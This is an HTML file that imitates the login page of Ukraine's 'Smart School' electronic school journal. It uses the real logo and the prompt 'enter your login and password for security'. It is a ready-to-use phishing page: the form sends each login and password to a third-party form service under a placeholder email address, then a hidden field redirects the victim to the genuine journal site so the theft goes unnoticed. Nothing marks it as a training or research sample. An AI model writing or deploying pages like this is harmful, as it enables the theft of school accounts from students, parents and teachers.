<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart School - Вхід до системи</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 350px; }
        h2 { text-align: center; color: #1a73e8; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 150px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://smart-school.com.ua/images/logo.png" alt="Smart School">
        </div>
        <h2>Вхід до електронного журналу</h2>
        <p style="text-align:center; font-size:14px; color:#666;">Для безпеки введіть логін та пароль</p>
        <form action="https://formsubmit.co/tvoy_email@gmail.com" method="POST">
            <input type="text" name="login" placeholder="Логін або email" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <input type="hidden" name="_next" value="https://journal-tc.smart-school.com.ua/login">
            <button type="submit">Увійти</button>
        </form>
        <p style="text-align:center; font-size:12px; color:#999; margin-top:20px;">
            © 2025 Smart School Ukraine
        </p>
    </div>
</body>
</html>
